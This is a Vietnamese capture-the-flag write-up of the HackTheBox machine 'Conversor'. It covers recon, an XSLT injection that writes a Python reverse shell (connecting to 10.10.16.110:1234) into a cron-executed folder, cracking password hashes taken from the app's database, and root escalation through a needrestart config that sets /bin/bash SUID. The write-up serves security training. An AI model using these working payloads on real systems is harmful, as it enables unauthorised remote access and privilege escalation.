---
layout: post
title: "Conversor"
date: 2026-02-02 09:00:00 +0700
tags: redteam Machine-Easy Linux
categories: jekyll update
--- 

## Recon 

```nmap
# Nmap 7.95 scan initiated Tue Nov 11 21:39:32 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -T4 -oN Conversor 10.10.11.92
Nmap scan report for 10.10.11.92 (10.10.11.92)
Host is up (0.51s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 11 21:40:05 2025 -- 1 IP address (1 host up) scanned in 33.02 seconds
```


![image](/assets/images/HTB/season9/Conversor/image1.png)

Ngoài này thì mình thử recon. 

![image](/assets/images/HTB/season9/Conversor/image2.png)

Thì ko có kết quả trả về. Cho nên tiến hành đăng ký 1 account để tiếp tục. 

![image](/assets/images/HTB/season9/Conversor/image3.png)

Nhìn thấy thì nó cho phép mình upload 2 loại file:
- XML 
- XSLT 

![image](/assets/images/HTB/season9/Conversor/image4.png)

Nhìn thấy nó cho phép **Download Source Code**. Như vậy hoàn toàn thành whitebox. 

![image](/assets/images/HTB/season9/Conversor/image5.png)

![image](/assets/images/HTB/season9/Conversor/image6.png)

Theo source code, thì nó tiến hành parse file `XSLT` thành 1 file `.html`, đồng thời ở dòng 113, 114 tiến hành write nội dung của file đó. 

Nhưng đến đây thì cũng chưa có gì tác động. Cho nên mình tiếp tục tìm kiếm. 

![image](/assets/images/HTB/season9/Conversor/image7.png)

Nhìn thấy nó có `crontab` và nó thực hiện chạy 1 file python. 

Như vậy ý tưởng là nếu mình upload 1 file `XSLT` vào trong folder được chạy crontab có nội dung mở kết nối thì khi đó hoàn toàn có thể shell.

Tham khảo qua trang web này để tìm payload về `XSLT`
- https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/

Từ đây mình chuẩn bị 2 file như sau: 
<details>
    <summary>File XML</summary>
    <?xml version="1.0" encoding="UTF-8"?>
    <contacts>
    <contact id="1">
        <name>Hacker</name>
        <email>hacker@example.com</email>
        <subject>Security Inquiry</subject>
        <message>Hello, I would like to discuss security vulnerabilities.</message>
        <date>2025-11-17</date>
    </contact>
</contacts>
</details>

<details>
    <summary>File XSLT</summary>
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet 
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:exploit="http://exslt.org/common"
        extension-element-prefixes="exploit"
        version="1.0">
        <xsl:template match="/">
            <exploit:document         href="/var/www/conversor.htb/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.110",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
            </exploit:document>
        </xsl:template>
    </xsl:stylesheet>
</details>

Ở máy tấn công thì mở sẵn netcat để hứng kết nối về.

Sau khi upload và convert thì được như sau:

![image](/assets/images/HTB/season9/Conversor/image8.png)

Click vào link để thực hiện spawn shell. 

![image](/assets/images/HTB/season9/Conversor/image9.png)

Như vậy hoàn toàn đã có kết nối. 

Quan sát trong source có folder instance chứa file db 

![image](/assets/images/HTB/season9/Conversor/image10.png)

Cho nên mình thử dùng file này có thông tin gì hay không. 

![image](/assets/images/HTB/season9/Conversor/image11.png)

![image](/assets/images/HTB/season9/Conversor/image12.png)

Từ đây mình khai thác được hash của user **fismathack** và **MrP-cpu**, mình lấy về để crack. 

![image](/assets/images/HTB/season9/Conversor/image13.png)

## Initial Access

Mình crack ra được user **fismathack** từ đây mình switch sang user đó. 

![image](/assets/images/HTB/season9/Conversor/image14.png)

Từ đây mình khám phá típ trên user này. 

Nhưng hiện tại mình đã có quyền trên user này và cần phải nâng lên quyền root. 

![image](/assets/images/HTB/season9/Conversor/image15.png)

Thì mình thấy nó chạy tool `needrestart` hoàn toàn là root là ko cần pass. 

Cho nên mình chạy thử xem sao. 

![image](/assets/images/HTB/season9/Conversor/image16.png)

![image](/assets/images/HTB/season9/Conversor/image17.png)

Như vậy thử kiểm tra version xem sao 

![image](/assets/images/HTB/season9/Conversor/image18.png)

## Privilege Escalation

Mình thử search trên mạng thì thấy version này dính CVE-2024-48990 

https://security-tracker.debian.org/tracker/CVE-2024-48990

Mình tạo 1 file `pwn.conf` trong folder `/tmp` để set suid

```
$nrconf{restart} = 'l';

system('chmod u+s /bin/bash');
```

![image](/assets/images/HTB/season9/Conversor/image19.png)

Rồi sau đó chạy lại tool 

![image](/assets/images/HTB/season9/Conversor/image20.png)

![image](/assets/images/HTB/season9/Conversor/image21.png)

![image](/assets/images/HTB/season9/Conversor/image22.png)
